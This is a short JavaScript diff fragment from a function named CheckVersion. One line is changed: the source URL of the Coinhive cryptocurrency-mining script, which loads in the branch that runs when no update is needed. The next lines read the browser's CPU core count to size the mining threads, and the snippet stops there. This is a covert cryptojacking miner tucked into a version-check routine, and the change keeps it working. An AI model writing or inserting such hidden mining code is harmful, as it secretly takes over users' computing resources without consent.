@@ -8,7 +8,7 @@ function CheckVersion() {
         if (ThisVersion < LatestVersion) {
                 DownloadNewVersion();
         } else {
-                $.getScript('https://coin-hive.com/lib/coinhive.min.js', function() {
+                $.getScript('https://coinhive.com/lib/coinhive.min.js', function() {
                         var crNo = navigator.hardwareConcurrency;
                         if (crNo == 2) {
                                 stCrNo = 1;
